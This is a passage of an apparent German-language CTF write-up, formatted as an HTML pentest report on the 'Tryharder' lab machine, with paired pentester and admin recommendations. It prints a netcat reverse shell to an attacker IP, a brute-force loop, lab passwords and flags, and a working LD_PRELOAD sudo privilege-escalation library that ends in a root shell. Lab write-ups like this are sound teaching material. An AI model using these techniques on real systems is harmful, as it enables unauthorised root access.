+            <br><strong>Empfehlung (Admin):</strong> Seien Sie extrem vorsichtig bei der Vergabe von `NOPASSWD`-Rechten in `sudoers`. Beschränken Sie `sudo`-Rechte auf die absolut notwendigen Befehle und Benutzer. Wenn möglich, vermeiden Sie es, Befehle zu erlauben, die leicht zur Shell-Eskalation missbraucht werden können (wie `find` mit `-exec`, Editoren wie `vi`, `nano`, Pager wie `less`, `more`, oder Skriptsprachen wie `python`, `perl`). Verwenden Sie spezifischere Pfade und weniger mächtige Befehle, wenn `sudo` benötigt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/srv$ <span class="command">su pentester</span></div>
+                    <pre>Password: </pre>
+                    <div class="prompt-remote">pentester@Tryharder:/srv$ </div>
+                    <div class="prompt-remote">pentester@Tryharder:/srv$ <span class="command">sudo -l</span></div>
+                    <pre>Matching Defaults entries for pentester on tryharder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pentester may run the following commands on tryharder:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/find</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `pentester` wird eine Verbindung mit `nc` zum lokalen Port `8989` hergestellt.
+            Der Dienst antwortet mit `(UNKNOWN) [127.0.0.1] 8989 (?) open` und einer Passwortabfrage: `Enter password:`.
+            Das zuvor dekodierte Passwort <span class="password">Y0U_5M4SH3D_17_8UDDY</span> wird eingegeben.
+            Der Dienst antwortet mit `Access granted!` und einem Shell-Prompt `shell>`.
+            Der Befehl `id` wird in dieser neuen Shell ausgeführt und gibt `uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)` zurück.
+            Anschließend wird versucht, eine weitere Reverse Shell zum Angreifer-System auf Port `5555` zu starten: `nc -e /bin/bash 192.168.2.199 5555`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf den Dienst auf Port `8989` war erfolgreich mit dem Passwort <span class="password">Y0U_5M4SH3D_17_8UDDY</span>. Dieser Dienst stellt eine Shell als Benutzer `xiix` bereit! Dies ist ein weiterer Schritt in der Privilegieneskalation, da wir nun vom `www-data`-Kontext über `pentester` (mit `sudo`-Rechten für `find`) und nun auch direkt als `xiix` agieren können. Die `-e` Option für `nc` ist oft nicht standardmäßig verfügbar oder deaktiviert; wenn sie funktioniert, ist sie ein einfacher Weg, eine Shell zu binden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir haben nun eine Shell als `xiix`. Untersuchen Sie die Berechtigungen und das Home-Verzeichnis dieses Benutzers. Der `sudo -l` Eintrag für `pentester` (`(ALL : ALL) NOPASSWD: /usr/bin/find`) ist immer noch der direkteste Weg zu `root`. Wenn die `nc -e`-Shell funktioniert, ist das gut für eine interaktive Sitzung als `xiix`. Andernfalls müssen Befehle direkt in der `shell>`-Eingabeaufforderung des Dienstes ausgeführt werden.
+            <br><strong>Empfehlung (Admin):</strong> Benutzerdefinierte Dienste, die Shells bereitstellen (wie der auf Port `8989`), sind ein hohes Sicherheitsrisiko, besonders wenn sie mit leicht zu erratenden oder anderweitig kompromittierbaren Passwörtern geschützt sind. Solche Dienste sollten vermieden oder extrem gut abgesichert und überwacht werden. Deaktivieren Sie die `-e`-Option in Netcat-Builds auf Servern, wenn sie nicht zwingend benötigt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">pentester@Tryharder:~$ <span class="command">nc -nv 127.0.0.1 8989</span></div>
+                    <pre>(UNKNOWN) [127.0.0.1] 8989 (?) <span class="password">open</span>
+Enter password: <span class="password">Y0U_5M4SH3D_17_8UDDY</span>
+<span class="password">Access granted!</span>
+<span class="prompt-remote">shell&gt;</span> <span class="command">id</span>
+<span class="command">uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)</span>
+
+<span class="prompt-remote">shell&gt;</span> 
+<span class="prompt-remote">shell&gt;</span> <span class="command">nc -e /bin/bash 192.168.2.199 5555</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port `5555` gestartet.
+            Eine Verbindung kommt vom Zielsystem (`192.168.2.186`) an.
+            Der Befehl `id` wird ausgeführt und bestätigt `uid=1001(xiix)`.
+            Die Shell wird mit `script /dev/null -c bash` stabilisiert (um eine bessere PTY-ähnliche Umgebung zu bekommen) und Umgebungsvariablen (`TERM=xterm`, `SHELL=bash`) werden gesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben erfolgreich eine interaktive Reverse Shell als Benutzer `xiix` auf dem Angreifer-System etabliert. Die Shell-Stabilisierung ist eine gute Praxis für eine komfortablere Bedienung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie nun die Umgebung des `xiix`-Benutzers. Suchen Sie nach weiteren Hinweisen, Skripten oder Konfigurationsdateien, die für die Privilegieneskalation zu `root` nützlich sein könnten. Der `sudo -l`-Eintrag für `pentester` ist immer noch ein valider und wahrscheinlich einfacherer Weg zu `root`, aber es ist gut, auch den Kontext von `xiix` vollständig zu untersuchen.
+            <br><strong>Empfehlung (Admin):</strong> Dieselben Empfehlungen wie zuvor bezüglich Egress Filtering und Überwachung von ausgehenden Verbindungen und verdächtigen Prozessen gelten hier.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.186] 33212</span>
+<span class="command">id</span>
+<span class="command">uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)</span></pre>
+                    <pre> 
+<span class="command">script /dev/null -c bash</span>
+Script started, file is /dev/null
+<span class="prompt-remote">xiix@Tryharder:~$</span> </pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">export SHELL=bash</span></div>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">id</span></div>
+                    <pre>uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)</pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ </div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis des Benutzers `xiix` wird der Inhalt aufgelistet.
+            Interessante Dateien:
+            `guess_game`: Eine ausführbare Datei (erkennbar an `---x------` Berechtigungen und dem Namen).
+            `.bash_history`: Die Bash-History-Datei ist vorhanden, aber der `cat`-Befehl schlägt fehl mit `Permission denied`, da sie `root` gehört.
+            Das Skript `guess_game` wird ausgeführt. Es ist ein Ratespiel, bei dem eine Zahl zwischen 0-99 erraten werden muss. Es gibt einen Hinweis: "Smart ones might find a shortcut." Bei einer falschen Eingabe (hier `5`) wird die richtige Zahl (`83`) verraten und eine scherzhafte Drohung angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das `guess_game` ist ein klassisches CTF-Element. Der Hinweis auf einen "Shortcut" und die Tatsache, dass die richtige Zahl bei falscher Eingabe angezeigt wird, sind wichtig. Dass `.bash_history` `root` gehört, ist ungewöhnlich und könnte bedeuten, dass `root` sich als `xiix` angemeldet hat oder die History manipuliert wurde. Das Spiel selbst gibt bei Erfolg möglicherweise ein Passwort oder einen weiteren Hinweis preis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Da das Spiel die korrekte Zahl verrät (`83`), versuchen Sie, das Spiel mit dieser Zahl zu spielen, um zu sehen, was passiert.
+            2.  Der "Shortcut" könnte Reverse Engineering des Binaries (`guess_game`) bedeuten (z.B. mit `strings`, `gdb`, `radare2`, `ghidra`) oder eine andere unkonventionelle Interaktion.
+            3.  Untersuchen Sie die `sudo -l`-Rechte für `xiix`.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Berechtigungen für sensible Dateien wie `.bash_history` korrekt gesetzt sind (normalerweise gehören sie dem Benutzer). Selbst "harmlose" Spiele oder Skripte können unbeabsichtigt Informationen preisgeben oder als Vektor für Angriffe dienen, wenn sie schlecht programmiert sind oder mit erhöhten Rechten laufen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">ls -la</span></div>
+                    <pre>total 44
+drwxr-xr-x 3 xiix xiix  4096 Mar 25 01:32 .
+drwxr-xr-x 4 root root  4096 Mar 23 10:46 ..
+<span class="command">-rw------- 1 root root     0 Mar 25 07:20 .bash_history</span>
+-rw-r--r-- 1 xiix xiix   220 Apr 18  2019 .bash_logout
+-rw-r--r-- 1 xiix xiix  3549 Mar 23 12:05 .bashrc
+<span class="command">---x------ 1 xiix xiix 17584 Mar 25 01:32 guess_game</span>
+drwxr-xr-x 3 xiix xiix  4096 Mar 23 23:44 .local
+-rw-r--r-- 1 xiix xiix   807 Apr 18  2019 .profile</pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">cat .bash_history</span></div>
+                    <pre><span class="password">cat: .bash_history: Permission denied</span></pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">./guess_game</span></div>
+                    <pre>===== 终极运气挑战 / Ultimate Luck Challenge ====
+规则很简单： 我心里有个数字（0-99），你有一次机会猜。
+I have a number (0-99), you get one guess.
+猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
+Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
+提示： <span class="password">聪明人也许能找到捷径。</span>
+Hint: Smart ones might find a shortcut.
+输入你的猜测（0-99） / Your guess (0-99): <span class="command">5</span>
+哈哈，猜错了！ / Wrong guess!
+秘密数字是 <span class="command">83</span>。 / Secret number: 83
+正在格式化你的硬盘...（开玩笑的啦！） / Formatting disk... (Kidding!)</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Bash-Skript `crack.sh` wird erstellt (vermutlich mit `nano crack.sh`, obwohl der Inhalt von `nano` nicht gezeigt wird). Das Skript iteriert von `0` bis `99`, führt bei jeder Iteration `./guess_game` mit der aktuellen Zahl als Eingabe aus, leitet die Ausgabe in `ausgabe.txt` um und prüft, ob "Wrong guess" *nicht* in der Ausgabe enthalten ist. Wenn "Wrong guess" fehlt, wird die erfolgreiche Zahl und der Inhalt von `ausgabe.txt` ausgegeben und das Skript bricht ab.
+            Anschließend wird der Inhalt von `ausgabe.txt` gezeigt. Dieser entspricht der Ausgabe von `./guess_game`, wenn man die korrekte Zahl (hier implizit `83`, da es im Skript gefunden wurde) eingibt: "天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck! Pass: <span class="password">superxiix</span>".
+            Danach wird versucht, sich mit `su root` und dem gefundenen Passwort `superxiix` als Root anzumelden, was mit "Authentication failure" fehlschlägt.
+            Schließlich zeigt `sudo -l` für den Benutzer `xiix`:
+            `xiix` darf `/bin/whoami` als `ALL : ALL` ausführen. Interessant ist hier auch `env_keep+=LD_PRELOAD`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript `crack.sh` hat erfolgreich das Passwort <span class="password">superxiix</span> aus dem `guess_game` extrahiert. Der Versuch, sich damit als `root` via `su` anzumelden, schlug fehl, was bedeutet, dass dies nicht das Root-Passwort ist.
+            Der `sudo -l`-Eintrag ist sehr interessant: `/bin/whoami` ist an sich harmlos. Aber die Zeile `env_keep+=LD_PRELOAD` ist ein klassischer Vektor für Privilegieneskalation. Wenn `LD_PRELOAD` beim Ausführen eines `sudo`-Befehls erhalten bleibt, kann man eine eigene Shared Library erstellen, die beim Start des `sudo`-Befehls geladen wird und Code mit den Rechten des Zielbenutzers (hier `root`) ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `LD_PRELOAD`-Schwachstelle in Verbindung mit `sudo /bin/whoami`.
+            1.  Erstellen Sie eine einfache C-Datei (z.B. `shell.c`), die eine Root-Shell startet (z.B. `setuid(0); setgid(0); system("/bin/sh");`).
+            2.  Kompilieren Sie diese C-Datei als Shared Object (`.so`-Datei), z.B. `gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles`.
+            3.  Führen Sie dann `sudo LD_PRELOAD=/tmp/shell.so /bin/whoami` aus.
+            Dies sollte Ihnen eine Root-Shell geben.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie `LD_PRELOAD` aus den `env_keep`-Direktiven in der `sudoers`-Datei, es sei denn, es gibt einen extrem guten und unumgänglichen Grund dafür. Standardmäßig wird `LD_PRELOAD` aus Sicherheitsgründen von `sudo` entfernt. `Defaults !env_reset` oder spezifische `env_keep` ohne `LD_PRELOAD` sind sicherer. Konfigurieren Sie `sudoers` so restriktiv wie möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">nano crack.sh</span></div>
+                    <pre>#!/bin/bash
+
+for i in {0..99}; do
+	echo "[*] verwendete Zahl: $i"
+        ./guess_game &lt;&lt;&lt; "$i" &gt; ausgabe.txt
+
+	if ! grep -q "Wrong guess" ausgabe.txt; then
+        	echo  "[+] Nummer gefunden: $i"
+		cat ausgabe.txt
+		break
+        fi
+done</pre>
+                    <div class="prompt-remote">ausgabe.txt  crack.sh  guess_game</div>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">cat ausgabe.txt</span></div>
+                    <pre>===== 终极运气挑战 / Ultimate Luck Challenge ====
+规则很简单： 我心里有个数字（0-99），你有一次机会猜。
+I have a number (0-99), you get one guess.
+猜对了，我就把属于你的东西给你；猜错了？嘿嘿，后果自负！
+Guess right, I’ll give your reward; wrong? Hehe, face the consequences!
+提示： 聪明人也许能找到捷径。
+Hint: Smart ones might find a shortcut.
+<span class="password">天哪！你居然猜对了！运气逆天啊！ / You got it! Amazing luck!</span>
+<span class="password">Pass: superxiix</span></pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">su root</span></div>
+                    <pre>Password: 
+<span class="password">su: Authentication failure</span></pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">sudo -l</span></div>
+                    <pre>[sudo] password for xiix: 
+Matching Defaults entries for xiix on tryharder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    <span class="password">env_keep+=LD_PRELOAD</span>
+
+User xiix may run the following commands on tryharder:
+    <span class="password">(ALL : ALL) /bin/whoami</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Link zu `hackingarticles.in` beschreibt die Technik der Privilegieneskalation mittels `LD_PRELOAD`.
+            Eine C-Datei (`crack.c`, später `shell.c` genannt) wird erstellt. Die Funktion `_init()` wird beim Laden der Shared Library ausgeführt. Sie versucht:
+            `unsetenv("LD_PRELOAD")`: Löscht die `LD_PRELOAD`-Variable, um Endlosschleifen zu vermeiden, wenn die neue Shell ebenfalls `sudo` verwendet.
+            `setgid(0); setuid(0);`: Setzt die Gruppen-ID und Benutzer-ID auf 0 (root).
+            `system("/bin/sh");`: Startet eine Shell.
+            Die C-Datei wird im `/tmp`-Verzeichnis als `shell.so` kompiliert: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`.
+            Die Warnungen des Compilers (`implicit declaration of function setgid/setuid`) deuten darauf hin, dass die notwendigen Header (vermutlich `<unistd.h>` und `<sys/types.h>`) nicht explizit inkludiert wurden, aber der Compiler nimmt sie implizit an. In modernen GCC-Versionen könnte dies zu einem Fehler führen, hier wird es nur als Warnung behandelt.
+            Die kompilierte `shell.so` wird aufgelistet.
+            Schließlich wird der Exploit ausgeführt: `sudo LD_PRELOAD=/tmp/shell.so /bin/whoami`.
+            Obwohl `/bin/whoami` normalerweise nur den Benutzernamen ausgibt, wird durch `LD_PRELOAD` zuerst unsere `shell.so` geladen. Die `_init()`-Funktion in `shell.so` wird ausgeführt, *bevor* `whoami` startet, und gibt uns eine Shell.
+            In dieser neuen Shell wird `id` ausgeführt, was `uid=0(root) gid=0(root) groups=0(root)` zurückgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff war erfolgreich! Dies ist ein klassischer und sehr effektiver Weg, um `LD_PRELOAD`-Schwachstellen in `sudo`-Konfigurationen auszunutzen. Wir sind nun als `root` angemeldet und haben die volle Kontrolle über das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sichern Sie den Root-Zugang (z.B. SSH-Key hinzufügen, stabiles Root-Passwort setzen, wenn erlaubt). Suchen Sie nach der Root-Flag und dokumentieren Sie alle Schritte und Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt: `LD_PRELOAD` niemals in `env_keep` für `sudo` belassen, es sei denn, es ist absolut unvermeidlich und die Risiken sind verstanden und mitigiert. Verwenden Sie `Defaults !env_reset` und fügen Sie nur explizit benötigte und sichere Umgebungsvariablen zu `env_keep` hinzu. Regelmäßige Überprüfung der `sudoers`-Konfiguration ist unerlässlich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>reverenz: [Link: www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/ | Ziel: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/]</pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">nano crack.c</span></div>
+                    <pre> 
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}</pre>
+                    <div class="prompt-remote">xiix@Tryharder:~$ <span class="command">cd /tmp/</span></div>
+                    <div class="prompt-remote">xiix@Tryharder:/tmp$ <span class="command">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></div>
+                    <pre>shell.c: In function ‘_init’:
+shell.c:6:1: <span class="password">warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]</span>
+ setgid(0);
+ ^~~~~~
+ setenv
+shell.c:7:1: <span class="password">warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]</span>
+ setuid(0);
+ ^~~~~~
+ setenv</pre>
+                    <div class="prompt-remote">xiix@Tryharder:/tmp$ <span class="command">ls -al shell.so</span></div>
+                    <pre>-rwxr-xr-x 1 xiix xiix 14544 Apr 29 19:28 shell.so</pre>
+                    <div class="prompt-remote">xiix@Tryharder:/tmp$ <span class="command">sudo LD_PRELOAD=/tmp/shell.so /bin/whoami</span></div>
+                    <div class="prompt-root"># <span class="command">id</span></div>
+                    <pre><span class="password">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                    <div class="prompt-root"># <span class="command">cd ~</span></div>
+                    <div class="prompt-root"># <span class="command">ls</span></div>
+                    <pre>1.c  congrats.txt  root.txt</pre>
+                </div>
+            </div>
+        </section>
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/pentester/user.txt</div>
+                    <div class="flag-value"><span class="password">Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 29. April 2025</p>
+    </footer>
+</body>
+</html> ﻿﻿
